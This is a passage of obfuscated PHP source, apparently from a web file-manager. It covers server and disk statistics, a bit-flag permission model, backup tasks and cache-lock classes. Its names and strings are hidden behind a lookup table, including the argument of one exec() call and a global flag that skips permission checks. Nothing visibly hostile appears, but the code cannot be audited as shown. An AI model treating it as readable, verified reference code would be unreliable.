$this->typeLogCnt($fé‹›ô¦¿ò[33], $fé‹›ô¦¿ò[2035])); } private function typeLogCnt($DÒÕòğóÒá = '', $fÂ¯”™›†Â = "\x69\144") { goto d‹–ò¸å‡–; d‹–ò¸å‡–: $F‡»—ÀÔ‘Ü =& $_SERVER[í™]; $AÜËÎèÔÕï = array($F‡»—ÀÔ‘Ü[103] => array($F‡»—ÀÔ‘Ü[2062], $F‡»—ÀÔ‘Ü[2063]), $F‡»—ÀÔ‘Ü[404] => array($F‡»—ÀÔ‘Ü[2064], $F‡»—ÀÔ‘Ü[2065]), $F‡»—ÀÔ‘Ü[2060] => array($F‡»—ÀÔ‘Ü[2066], $F‡»—ÀÔ‘Ü[2067], $F‡»—ÀÔ‘Ü[2068]), $F‡»—ÀÔ‘Ü[2061] => array($F‡»—ÀÔ‘Ü[2069], $F‡»—ÀÔ‘Ü[2070]), $F‡»—ÀÔ‘Ü[2071] => array($F‡»—ÀÔ‘Ü[2072], $F‡»—ÀÔ‘Ü[2073], $F‡»—ÀÔ‘Ü[2074])); $dğÍ–ŒÓ«’ = strtotime(date($F‡»—ÀÔ‘Ü[2031])); goto eÓáÔ³äª¦; dË»§Ñ†·¶: return (int) $A½­ìÆ©Ê¾; goto D¾·ÓÏ«µ•; eÓáÔ³äª¦: $EçøÄ›±Âá = array($F‡»—ÀÔ‘Ü[187] => array($F‡»—ÀÔ‘Ü[913], $dğÍ–ŒÓ«’)); if ($DÒÕòğóÒá) { $EçøÄ›±Âá[$F‡»—ÀÔ‘Ü[29]] = array($F‡»—ÀÔ‘Ü[7], $AÜËÎèÔÕï[$DÒÕòğóÒá]); } $A½­ìÆ©Ê¾ = Model($F‡»—ÀÔ‘Ü[2034])->where($EçøÄ›±Âá)->count($fÂ¯”™›†Â); goto dË»§Ñ†·¶; D¾·ÓÏ«µ•: } private function optionServer() { goto EÙÉÄÁˆ¦; c–Ú¬„»Í: return array($e‹ïÂÈ­†Ø[2077] => $eÚçÇº˜‹¯ ? $eÚçÇº˜‹¯[$e‹ïÂÈ­†Ø[2078]] : 0, $e‹ïÂÈ­†Ø[2079] => $eÚçÇº˜‹¯ ? $eÚçÇº˜‹¯[$e‹ïÂÈ­†Ø[2080]] : 0, $e‹ïÂÈ­†Ø[2081] => (int) $BÇŸ˜×¥ò•[$e‹ïÂÈ­†Ø[2078]] * 1024 * 1024 * 1024, $e‹ïÂÈ­†Ø[2082] => (int) $E„ù¥¿£Ä…, $e‹ïÂÈ­†Ø[2083] => ucfirst($cï‰ğõˆß), $e‹ïÂÈ­†Ø[2084] => $e‹ïÂÈ­†Ø[2085] . PHP_VERSION, $e‹ïÂÈ­†Ø[2086] => phpBuild64() ? 64 : 32, $e‹ïÂÈ­†Ø[676] => str_replace($e‹ïÂÈ­†Ø[2087], $e‹ïÂÈ­†Ø[889], $EâšÕ¿æ÷«), $e‹ïÂÈ­†Ø[337] => ucfirst($DèâÈİ¤), $e‹ïÂÈ­†Ø[28] => $_SERVER[$e‹ïÂÈ­†Ø[2088]]); goto EÉ§„–ääù; EÙÉÄÁˆ¦: $e‹ïÂÈ­†Ø =& $_SERVER[í™]; $eÚçÇº˜‹¯ = $this->diskDriver(); $BÇŸ˜×¥ò• = KodIO::defaultDriver(); goto eÔˆ¶¼Õ°; cçÒî«²…: if ($EâšÕ¿æ÷« == $e‹ïÂÈ­†Ø[705]) { $CºµÎÃ¨Æ = explode($e‹ïÂÈ­†Ø[1062], $bğôÏ „ï[$e‹ïÂÈ­†Ø[872]]); $EâšÕ¿æ÷« = $CºµÎÃ¨Æ[0]; } if ($EâšÕ¿æ÷« == $e‹ïÂÈ­†Ø[708] || $EâšÕ¿æ÷« == $e‹ïÂÈ­†Ø[709]) { $F£ˆÃì§ğ£ = Model()->db()->query($e‹ïÂÈ­†Ø[2075]); $d•ÉïòƒÁ = $F£ˆÃì§ğ£[0] && isset($F£ˆÃì§ğ£[0][$e‹ïÂÈ­†Ø[1327]]) ? $F£ˆÃì§ğ£[0][$e‹ïÂÈ­†Ø[1327]] : 0; $EâšÕ¿æ÷« = $e‹ïÂÈ­†Ø[2076] . ($d•ÉïòƒÁ ? $e‹ïÂÈ­†Ø[8] . $d•ÉïòƒÁ : $e‹ïÂÈ­†Ø[33]); } $DèâÈİ¤ = $GLOBALS[$e‹ïÂÈ­†Ø[6]][$e‹ïÂÈ­†Ø[337]][$e‹ïÂÈ­†Ø[743]]; goto c–Ú¬„»Í; eÔˆ¶¼Õ°: $B´ÔƒÕ = array($e‹ïÂÈ­†Ø[725] => $BÇŸ˜×¥ò•[$e‹ïÂÈ­†Ø[367]]); $E„ù¥¿£Ä… = Model($e‹ïÂÈ­†Ø[422])->where($B´ÔƒÕ)->sum($e‹ïÂÈ­†Ø[77]); $b˜êªŠ˜áù = explode($e‹ïÂÈ­†Ø[50], $_SERVER[$e‹ïÂÈ­†Ø[139]]); goto Aõ±š ğ¤; Aõ±š ğ¤: $cï‰ğõˆß = $b˜êªŠ˜áù[0]; $bğôÏ „ï = $GLOBALS[$e‹ïÂÈ­†Ø[6]][$e‹ïÂÈ­†Ø[17]]; $EâšÕ¿æ÷« = $bğôÏ „ï[$e‹ïÂÈ­†Ø[873]]; goto cçÒî«²…; EÉ§„–ääù: } private function diskDriver() { goto C÷ó¯³ ˜æ; C÷ó¯³ ˜æ: $B·×œÊ¸ë =& $_SERVER[í™]; $eëïø¶ì…‡ = $B·×œÊ¸ë[8]; $cêà®¼ÑŞ‘ = $GLOBALS[$B·×œÊ¸ë[6]][$B·×œÊ¸ë[2089]] == $B·×œÊ¸ë[2090]; goto BÁÛ¹²áÂ¦; b×ç”Ğ³áé: $F™˜°¸ø ¢ = $eäÔ±Ï¿Î» - @disk_free_space($eëïø¶ì…‡); return array($B·×œÊ¸ë[2078] => $eäÔ±Ï¿Î», $B·×œÊ¸ë[2080] => $F™˜°¸ø ¢); goto aÎÏœË¶ß‹; BÁÛ¹²áÂ¦: if ($cêà®¼ÑŞ‘) { $eëïø¶ì…‡ = $B·×œÊ¸ë[2091]; if (function_exists($B·×œÊ¸ë[2092])) { exec($B·×œÊ¸ë[2093], $f‡‚«íÍïœ); $eëïø¶ì…‡ = $f‡‚«íÍïœ[1] . $B·×œÊ¸ë[8]; } } if (!file_exists($eëïø¶ì…‡)) { return; } $eäÔ±Ï¿Î» = @disk_total_space($eëïø¶ì…‡); goto b×ç”Ğ³áé; aÎÏœË¶ß‹: } public function fileChart($aõ‘ãğ§ä) { goto E¤‘°¶ù; E¤‘°¶ù: $dìˆº…ë =& $_SERVER[í™]; if (isset($aõ‘ãğ§ä[$dìˆº…ë[1423]])) { return Model($dìˆº…ë[734])->userFileTypeProfile($aõ‘ãğ§ä[$dìˆº…ë[1423]]); } if (isset($aõ‘ãğ§ä[$dìˆº…ë[2094]])) { return Model($dìˆº…ë[734])->groupFileTypeProfile($aõ‘ãğ§ä[$dìˆº…ë[2094]]); } goto AæÆÆîõİ; AæÆÆîõİ: $dÕ¸×¼ƒ› = $this->sourceSize(); $fÈğšƒõŸÜ = array($dìˆº…ë[463] => 0, $dìˆº…ë[371] => 1); $bùÂÆÀñ¢ë = Model($dìˆº…ë[734])->where($fÈğšƒõŸÜ)->sum($dìˆº…ë[77]); goto F¤¢…‘Ï¹Ï; F¤¢…‘Ï¹Ï: $fÈğšƒõŸÜ[$dìˆº…ë[371]] = 2; $B––Áäô = Model($dìˆº…ë[734])->where($fÈğšƒõŸÜ)->sum($dìˆº…ë[77]); return array($dìˆº…ë[680] => $dÕ¸×¼ƒ›[$dìˆº…ë[77]], $dìˆº…ë[2024] => $dÕ¸×¼ƒ›[$dìˆº…ë[2024]], $dìˆº…ë[2025] => (int) $bùÂÆÀñ¢ë, $dìˆº…ë[2026] => (int) $B––Áäô); goto Däƒˆ£»×; Däƒˆ£»×: } private function sourceSize() { $F‚ƒ–µÈ„· =& $_SERVER[í™]; $B†¶º¹´Ÿß = Model($F‚ƒ–µÈ„·[734])->where(array($F‚ƒ–µÈ„·[370] => 0))->sum($F‚ƒ–µÈ„·[77]); $aÓÙ‹îËê— = Model($F‚ƒ–µÈ„·[422])->sum($F‚ƒ–µÈ„·[77]); if ($aÓÙ‹îËê— > $B†¶º¹´Ÿß) { $aÓÙ‹îËê— = $B†¶º¹´Ÿß; } return array($F‚ƒ–µÈ„·[77] => (int) $B†¶º¹´Ÿß, $F‚ƒ–µÈ„·[2024] => (int) $aÓÙ‹îËê—); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $b¨ËÒÖÛô˜ =& $_SERVER[í™]; $díÚƒØºâ¢ = array(array($b¨ËÒÖÛô˜[386] => LNG($b¨ËÒÖÛô˜[2095]), $b¨ËÒÖÛô˜[2096] => $b¨ËÒÖÛô˜[2097], $b¨ËÒÖÛô˜[2098] => 6, $b¨ËÒÖÛô˜[2099] => 1, $b¨ËÒÖÛô˜[2100] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($b¨ËÒÖÛô˜[386] => LNG($b¨ËÒÖÛô˜[2101]), $b¨ËÒÖÛô˜[2096] => $b¨ËÒÖÛô˜[2102], $b¨ËÒÖÛô˜[2098] => 1, $b¨ËÒÖÛô˜[2099] => 1, $b¨ËÒÖÛô˜[2100] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($b¨ËÒÖÛô˜[386] => LNG($b¨ËÒÖÛô˜[2103]), $b¨ËÒÖÛô˜[2096] => $b¨ËÒÖÛô˜[2104], $b¨ËÒÖÛô˜[2098] => 2, $b¨ËÒÖÛô˜[2099] => 1, $b¨ËÒÖÛô˜[2100] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($b¨ËÒÖÛô˜[386] => LNG($b¨ËÒÖÛô˜[2105]), $b¨ËÒÖÛô˜[2096] => $b¨ËÒÖÛô˜[2104], $b¨ËÒÖÛô˜[2098] => 3, $b¨ËÒÖÛô˜[2099] => 1, $b¨ËÒÖÛô˜[2100] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($b¨ËÒÖÛô˜[386] => LNG($b¨ËÒÖÛô˜[2106]), $b¨ËÒÖÛô˜[2096] => $b¨ËÒÖÛô˜[2107], $b¨ËÒÖÛô˜[2098] => 4, $b¨ËÒÖÛô˜[2099] => 1, $b¨ËÒÖÛô˜[2100] => self::AUTH_SHOW | self::AUTH_VIEW), array($b¨ËÒÖÛô˜[386] => LNG($b¨ËÒÖÛô˜[2108]), $b¨ËÒÖÛô˜[2096] => $b¨ËÒÖÛô˜[2109], $b¨ËÒÖÛô˜[2098] => 5, $b¨ËÒÖÛô˜[2099] => 1, $b¨ËÒÖÛô˜[2100] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($b¨ËÒÖÛô˜[386] => LNG($b¨ËÒÖÛô˜[2110]), $b¨ËÒÖÛô˜[2096] => $b¨ËÒÖÛô˜[2111], $b¨ËÒÖÛô˜[2098] => 7, $b¨ËÒÖÛô˜[2099] => 1, $b¨ËÒÖÛô˜[2100] => 0)); return $díÚƒØºâ¢; } public static function authCheck($dÎóœ¼‘, $EÇ’â¯ê‰) { $dÎóœ¼‘ = intval($dÎóœ¼‘); if (_get($GLOBALS, $_SERVER[í™][459])) { return !0; } if ($dÎóœ¼‘ <= 0) { return !1; } if (($dÎóœ¼‘ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($dÎóœ¼‘ & $EÇ’â¯ê‰); } public static function authCheckShow($DíŸ¿…è¹) { return self::authCheck($DíŸ¿…è¹, self::AUTH_SHOW); } public static function authCheckView($båÇøª©ğ) { return self::authCheck($båÇøª©ğ, self::AUTH_VIEW); } public static function authCheckDownload($f²•îÀ¤…Ç) { return self::authCheck($f²•îÀ¤…Ç, self::AUTH_DOWNLOAD); } public static function authCheckUpload($e¢×ßò‘) { return self::authCheck($e¢×ßò‘, self::AUTH_UPLOAD); } public static function authCheckEdit($dÚ£¸¶¶ç¥) { return self::authCheck($dÚ£¸¶¶ç¥, self::AUTH_EDIT); } public static function authCheckRemove($FŠÀ¤‡È‹«) { return self::authCheck($FŠÀ¤‡È‹«, self::AUTH_REMOVE); } public static function authCheckShare($cˆ˜ç‚ï‹) { return self::authCheck($cˆ˜ç‚ï‹, self::AUTH_SHARE); } public static function authCheckComment($BÇœÈ²äÀ°) { return self::authCheck($BÇœÈ²äÀ°, self::AUTH_COMMENT); } public static function authCheckEvent($CÀª¿ˆÊÇ›) { return self::authCheck($CÀª¿ˆÊÇ›, self::AUTH_EVENT); } public static function authCheckRoot($C¤Ñ§‹¢ñ) { return self::authCheck($C¤Ñ§‹¢ñ, self::AUTH_ROOT); } public static function authDisable($d‡ƒ¿½½ÌÌ, $BÖ¼¿ğ¦µ) { if (intval($d‡ƒ¿½½ÌÌ) <= 0) { return 0; } return intval($d‡ƒ¿½½ÌÌ) & ~$BÖ¼¿ğ¦µ; } public $optionType = "\123\171\x73\x74\145\155\x2e\163\x6f\165\x72\143\145\x41\165\x74\150\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\x61\x75\x74\x68", "\x6c\x61\x62\145\x6c", "\x64\x69\x73\160\154\141\x79", "\x73\x79\x73\164\x65\x6d", "\x73\x6f\162\x74"); public function initData() { $eŒ ´Ñ¬ªğ = $this->authDefault(); foreach ($eŒ ´Ñ¬ªğ as $CªˆŞÔ‰¸) { $this->add($CªˆŞÔ‰¸); } } public function listData($eœ‘¯ÕœÑ = false, $f¹Ü›õŞŸ™ = "\x73\x6f\x72\164", $báæØÂŒ¯‚ = false) { return parent::listData($eœ‘¯ÕœÑ, $f¹Ü›õŞŸ™, $báæØÂŒ¯‚); } public function update($dÍçÖ®É¿, $cñîÅ¿ŒÔ”) { $cÇÅ’¬›Á… =& $_SERVER[í™]; $Bœ¥Â’µˆ = parent::listData($dÍçÖ®É¿); $eçî«å™– = $this->findByName($cñîÅ¿ŒÔ”[$cÇÅ’¬›Á…[28]]); if (!$Bœ¥Â’µˆ || $eçî«å™– && $eçî«å™–[$cÇÅ’¬›Á…[367]] != $Bœ¥Â’µˆ[$cÇÅ’¬›Á…[367]]) { return !1; } $this->filterAuth($cñîÅ¿ŒÔ”[$cÇÅ’¬›Á…[376]]); return parent::update($dÍçÖ®É¿, $cñîÅ¿ŒÔ”); } public function remove($EŞËçŒíùÓ) { $bßŠô³‰¬ = parent::listData($EŞËçŒíùÓ); if (!$bßŠô³‰¬ || $bßŠô³‰¬[$_SERVER[í™][1066]]) { return !1; } return parent::remove($EŞËçŒíùÓ); } public function add($D¥Êî‡ŒØ = array()) { goto aÏ“Õ‚Û; cã§ÍèÜÍÆ: return parent::insert($D¥Êî‡ŒØ); goto fÎÒÎ¼³´ô; aÏ“Õ‚Û: $FÎªîæ ˆ¿ =& $_SERVER[í™]; if ($this->findByName($D¥Êî‡ŒØ[$FÎªîæ ˆ¿[28]])) { return !1; } $f½”…È§ùº = array($FÎªîæ ˆ¿[28] => $FÎªîæ ˆ¿[33], $FÎªîæ ˆ¿[376] => 1, $FÎªîæ ˆ¿[2112] => $FÎªîæ ˆ¿[2113], $FÎªîæ ˆ¿[2114] => 1, $FÎªîæ ˆ¿[1066] => 0, $FÎªîæ ˆ¿[2115] => 0); goto c‘‚Å®¬Ï; c‘‚Å®¬Ï: $D¥Êî‡ŒØ = array_merge($f½”…È§ùº, $D¥Êî‡ŒØ); $D¥Êî‡ŒØ[$FÎªîæ ˆ¿[2115]] = $this->getSort(); $this->filterAuth($D¥Êî‡ŒØ[$FÎªîæ ˆ¿[376]]); goto cã§ÍèÜÍÆ; fÎÒÎ¼³´ô: } private function getSort() { $e½†Ÿã„Ïœ =& $_SERVER[í™]; $còòï½õŠ­ = parent::listData(); $fµ›ÄµäÍ = array_to_keyvalue($còòï½õŠ­, $e½†Ÿã„Ïœ[33], $e½†Ÿã„Ïœ[2115]); return empty($fµ›ÄµäÍ) ? 0 : max($fµ›ÄµäÍ) + 1; } private function filterAuth(&$D¿ÛéèªÊÌ) { goto d­¥Îæƒ; a¡Œ¨‘öñŒ: foreach ($EÖÄ„çù‰¥ as $a»ÌÈÁĞÈö) { if ($D¿ÛéèªÊÌ & $a»ÌÈÁĞÈö) { $d‘¸äÊ¤´İ[] = $a»ÌÈÁĞÈö; } } if (in_array(self::AUTH_ROOT, $d‘¸äÊ¤´İ)) { $D¿ÛéèªÊÌ = array_sum($EÖÄ„çù‰¥); return; } $fÊõ÷É­ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto EˆÃÄøã ; d­¥Îæƒ: if (!$D¿ÛéèªÊÌ) { return; } $EÖÄ„çù‰¥ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $d‘¸äÊ¤´İ = array(); goto a¡Œ¨‘öñŒ; EˆÃÄøã : foreach ($d‘¸äÊ¤´İ as $a»ÌÈÁĞÈö) { if (isset($fÊõ÷É­[$a»ÌÈÁĞÈö])) { $d‘¸äÊ¤´İ = array_merge($d‘¸äÊ¤´İ, $fÊõ÷É­[$a»ÌÈÁĞÈö]); } } $d‘¸äÊ¤´İ[] = self::AUTH_SHOW; $D¿ÛéèªÊÌ = array_sum(array_unique($d‘¸äÊ¤´İ)); goto EÏåÄÓ‹«â; EÏåÄÓ‹«â: } public function sort($aƒ…İÅìè, $eí·©Û¡‰) { return parent::update($aƒ…İÅìè, $eí·©Û¡‰); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\x62\x61\x63\x6b\x75\x70\x4c\x69\163\x74"; public $field = array("\x69\157", "\156\141\155\145", "\163\x74\x61\164\x75\163", "\x63\157\x6e\164\x65\156\x74", "\162\x65\x73\x75\154\164", "\164\x69\x6d\x65\x46\162\x6f\155", "\x74\x69\x6d\145\x54\157"); public function config() { goto EçŒµöÈß; EçŒµöÈß: $bÛõ»ºÜ‘… =& $_SERVER[í™]; $A¤œ×Ï©ó­ = Model($bÛõ»ºÜ‘…[1074])->get($bÛõ»ºÜ‘…[695]); $A¤œ×Ï©ó­ = json_decode($A¤œ×Ï©ó­, !0); goto Aïİ³ÌîÈ; b‚»á–ßÛ›: if (isset($fã‚éÒÃ—ù[$bÛõ»ºÜ‘…[190]])) { $fã‚éÒÃ—ù[$bÛõ»ºÜ‘…[190]] = json_decode($fã‚éÒÃ—ù[$bÛõ»ºÜ‘…[190]], !0); } if (isset($A¤œ×Ï©ó­[$bÛõ»ºÜ‘…[190]])) { $fã‚éÒÃ—ù[$bÛõ»ºÜ‘…[190]][$bÛõ»ºÜ‘…[1398]] = $A¤œ×Ï©ó­[$bÛõ»ºÜ‘…[190]]; unset($A¤œ×Ï©ó­[$bÛõ»ºÜ‘…[190]]); } return array_merge($fã‚éÒÃ—ù, $A¤œ×Ï©ó­); goto F³“ÍšğÖâ; f÷‘ÁÇ—‹: Action($bÛõ»ºÜ‘…[2116])->taskInit(); $d¯Á÷ùßŠí = Model($bÛõ»ºÜ‘…[2117])->listData(); foreach ($d¯Á÷ùßŠí as $EÌÃÛâŸé˜) { if ($EÌÃÛâŸé˜[$bÛõ»ºÜ‘…[1066]] == $bÛõ»ºÜ‘…[83] && $EÌÃÛâŸé˜[$bÛõ»ºÜ‘…[1411]] == $bÛõ»ºÜ‘…[2118]) { $fã‚éÒÃ—ù = $EÌÃÛâŸé˜; break; } } goto b‚»á–ßÛ›; Aïİ³ÌîÈ: $A¤œ×Ï©ó­ = is_array($A¤œ×Ï©ó­) ? $A¤œ×Ï©ó­ : array(); if (!isset($A¤œ×Ï©ó­[$bÛõ»ºÜ‘…[674]])) { $A¤œ×Ï©ó­[$bÛõ»ºÜ‘…[674]] = $bÛõ»ºÜ‘…[83]; } $fã‚éÒÃ—ù = array(); goto f÷‘ÁÇ—‹; F³“ÍšğÖâ: } public function listData($A¢Ù¥Äõ·÷ = false, $AîõÑš”åË = "\x6d\157\x64\151\146\171\124\151\x6d\145", $fùÏºÄ»„ = false) { return parent::listData($A¢Ù¥Äõ·÷, $AîõÑš”åË, !0); } public function lastItem() { $AµÀù…›Ÿ = $this->listData(); return !empty($AµÀù…›Ÿ[0]) ? $AµÀù…›Ÿ[0] : null; } public function kill($F—éİÜ©¡Ğ) { goto Cõ…¿¯–±ù; Cõ…¿¯–±ù: $cÄÉè–ÂÌ =& $_SERVER[í™]; $e·†—çî£³ = $this->listData($F—éİÜ©¡Ğ); if (!$e·†—çî£³ || empty($e·†—çî£³[$cÄÉè–ÂÌ[28]])) { return !0; } goto F“‰…ùùôã; EŸÏÜ´—Èê: $fÜğ¢Êâ = $e·†—çî£³[$cÄÉè–ÂÌ[28]]; $BÛ…ÙõÀ–ğ = TEMP_FILES . $cÄÉè–ÂÌ[691] . $fÜğ¢Êâ . $cÄÉè–ÂÌ[8]; IO::remove($BÛ…ÙõÀ–ğ, !1); goto c‚¿–ÁŠÜ; c‚¿–ÁŠÜ: return $this->remove($F—éİÜ©¡Ğ); goto EÑ”ÇÊŞí; F“‰…ùùôã: Task::kill($cÄÉè–ÂÌ[694]); Task::kill($cÄÉè–ÂÌ[710]); Task::kill($cÄÉè–ÂÌ[718]); goto EŸÏÜ´—Èê; EÑ”ÇÊŞí: } public function remove($f‡²’±äĞÊ) { $CÄ¨¶µ“ªÛ = $this->listData($f‡²’±äĞÊ); if (!$CÄ¨¶µ“ªÛ) { return !0; } return $this->backupRemove($CÄ¨¶µ“ªÛ); } private function backupRemove($cãšºÒğù–) { $CºÌ»¿óì =& $_SERVER[í™]; parent::remove($cãšºÒğù–[$CºÌ»¿óì[367]]); $aîñÛ½¶ª† = "\173\151\x6f\x3a{$cãšºÒğù–[$CºÌ»¿óì[673]]}\175\x2f\144\141\x74\141\142\x61\x73\145\57\142\x61\143\x6b\x75\160\x5f" . $cãšºÒğù–[$CºÌ»¿óì[28]]; IO::remove($aîñÛ½¶ª†, !1); return !0; } public function start() { goto aÇ”•äô¬; AÒÔ¤¢‘“¬: return !0; goto AÍ„¼ğ÷ƒË; a©“àä: if (!$C£©’ÊÚö->dbFile()) { return !1; } if ($A¹®‘®»ÁÏ[$dºéÌâ¿ŞÅ[674]] == $dºéÌâ¿ŞÅ[470]) { $C£©’ÊÚö->file(); } Backup::set(array($dºéÌâ¿ŞÅ[671] => 1, $dºéÌâ¿ŞÅ[449] => time())); goto AÒÔ¤¢‘“¬; e‰³Ï¬Çˆô: if (!$A¹®‘®»ÁÏ || $A¹®‘®»ÁÏ[$dºéÌâ¿ŞÅ[1395]] != $dºéÌâ¿ŞÅ[83]) { return !1; } $B½ “®³Á„ = $this->process(); foreach ($B½ “®³Á„ as $dîğÕ»£) { if ($dîğÕ»£) { return Task::restart($dîğÕ»£[$dºéÌâ¿ŞÅ[367]]); } } goto AÇÔ»ÄíÅ; AÇÔ»ÄíÅ: $C£©’ÊÚö = new Backup(); $C£©’ÊÚö->keep(); if (!$C£©’ÊÚö->db()) { return !1; } goto a©“àä; aÇ”•äô¬: $dºéÌâ¿ŞÅ =& $_SERVER[í™]; if ($GLOBALS[$dºéÌâ¿ŞÅ[6]][$dºéÌâ¿ŞÅ[84]][$dºéÌâ¿ŞÅ[2119]] != $dºéÌâ¿ŞÅ[83]) { return !0; } $A¹®‘®»ÁÏ = $this->config(); goto e‰³Ï¬Çˆô; AÍ„¼ğ÷ƒË: } public function process() { $bµ‘ÕËù‘Ô =& $_SERVER[í™]; return array($bµ‘ÕËù‘Ô[676] => Task::get($bµ‘ÕËù‘Ô[694]), $bµ‘ÕËù‘Ô[679] => Task::get($bµ‘ÕËù‘Ô[710]), $bµ‘ÕËù‘Ô[167] => Task::get($bµ‘ÕËù‘Ô[718])); } public function restore() { $aàÆĞšŠÕ‹ =& $_SERVER[í™]; ActionCall($aàÆĞšŠÕ‹[959], !0, 1); ActionCall($aàÆĞšŠÕ‹[959], !0, 0); } } goto FøòĞŠ™; e‘£ÅáÒ„Í: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $C©‡‰˜‡­‡ =& $_SERVER[í™]; $FÅĞÏ£‘ˆ‰ = $GLOBALS[$C©‡‰˜‡­‡[6]][$C©‡‰˜‡­‡[337]]; self::$cachePath = $FÅĞÏ£‘ˆ‰[$C©‡‰˜‡­‡[167]][$C©‡‰˜‡­‡[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($A»Øğ‡ÀŠ®, $fĞ²êÌ»×Ë = 0) { goto B «±×ÂœĞ; d¸‚²ŠÈ: $this->unlock($A»Øğ‡ÀŠ®); return !1; goto C±áß°Ë³ë; B «±×ÂœĞ: $dàÁó«Ïà =& $_SERVER[í™]; $AÑÁÕ­ÍÖê = microtime(!0); $EŸ¿ÓäãŠ„ = $AÑÁÕ­ÍÖê + $fĞ²êÌ»×Ë + 0.0001; goto B‹‹ØŸ§š‘; B‹‹ØŸ§š‘: $aÛ¼ƒãâŒ = rtrim(self::$cachePath, $dàÁó«Ïà[8]) . $dàÁó«Ïà[762] . md5($A»Øğ‡ÀŠ®) . $dàÁó«Ïà[763]; if (file_exists($aÛ¼ƒãâŒ) && filemtime($aÛ¼ƒãâŒ) && filemtime($aÛ¼ƒãâŒ) < time() - 10) { @unlink($aÛ¼ƒãâŒ); } do { if (file_exists($aÛ¼ƒãâŒ)) { cacheLockWait(); continue; } $açŒ²ÂÁ = fopen($aÛ¼ƒãâŒ, $dàÁó«Ïà[764]); if (!$açŒ²ÂÁ) { return !1; } $D’²¥ë«®ª = flock($açŒ²ÂÁ, LOCK_EX | LOCK_NB); self::$caches[$A»Øğ‡ÀŠ®] = array($dàÁó«Ïà[765] => $açŒ²ÂÁ, $dàÁó«Ïà[167] => $aÛ¼ƒãâŒ); fwrite($açŒ²ÂÁ, $EŸ¿ÓäãŠ„); clearstatcache(); if ($açŒ²ÂÁ && $D’²¥ë«®ª) { return !0; } cacheLockWait(); } while (microtime(!0) < $EŸ¿ÓäãŠ„); goto d¸‚²ŠÈ; C±áß°Ë³ë: } public function lockGet($CÆğùÃØŒ) { $bæ Ñ…¤ì§ =& $_SERVER[í™]; $e§…»àº‚“ = rtrim(self::$cachePath, $bæ Ñ…¤ì§[8]) . $bæ Ñ…¤ì§[762] . md5($CÆğùÃØŒ) . $bæ Ñ…¤ì§[763]; return file_exists($e§…»àº‚“); } public function unlock($A÷Ÿ’Ç‡) { goto DºŸ‘¼í²Õ; A¥ª¹ÇèÜ: unset(self::$caches[$A÷Ÿ’Ç‡]); goto dßöÕÌ¾•Š; E¹ğ³—µœ: @flock($Cš…›æ“¥[$DÑù•‘Ö¬[765]], LOCK_UN); @fclose($Cš…›æ“¥[$DÑù•‘Ö¬[765]]); @unlink($Cš…›æ“¥[$DÑù•‘Ö¬[167]]); goto A¥ª¹ÇèÜ; DºŸ‘¼í²Õ: $DÑù•‘Ö¬ =& $_SERVER[í™]; $Cš…›æ“¥ = self::$caches[$A÷Ÿ’Ç‡]; if (!$Cš…›æ“¥) { return; } goto E¹ğ³—µœ; dßöÕÌ¾•Š: } } class CacheLockRedis { public function lock($d–ºª„Ğ‰³, $Dò¥®¬¶ï¿ = 10) { $eõÔ¢™òø = Cache::init(); $C¾¹Ï¿«ì¸ = microtime(!0) + $Dò¥®¬¶ï¿; while (microtime(!0) < $C¾¹Ï¿«ì¸) { $A­İøÁº…‰ = $eõÔ¢™òø->get($d–ºª„Ğ‰³); if (!$A­İøÁº…‰) { $AÏôå©İ“Ç = $eõÔ¢™òø->setLock($d–ºª„Ğ‰³, $C¾¹Ï¿«ì¸, $Dò¥®¬¶ï¿); if ($AÏôå©İ“Ç) { return !0; } } else { if ($A­İøÁº…‰ < microtime(!0)) { $eõÔ¢™òø->set($d–ºª„Ğ‰³, $C¾¹Ï¿«ì¸, $C¾¹Ï¿«ì¸); if ($eõÔ¢™òø->get($d–ºª„Ğ‰³) === $A­İøÁº…‰) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($E¿¤¯¨İŞ) { return Cache::init()->get($E¿¤¯¨İŞ); } public function unlock($A­•¯Í‹—õ) { return Cache::init()->remove($A­•¯Í‹—õ); } } class CacheLockMemcached { public function lock($Fõ²Â‰ò¤Ç, $eÚŒ¬§æØî = 0) { $AÕÕÃ…»Ê = Cache::init(); $b“İª²É£… = microtime(!0) + $eÚŒ¬§æØî; while (microtime(!0) < $b“İª²É£…) { $b³²­¤ĞœÁ = $AÕÕÃ…»Ê->get($Fõ²Â‰ò¤Ç); if (!$b³²­¤ĞœÁ || $b³²­¤ĞœÁ < microtime(!0)) { $bôŸÍŞÂ·¼ = 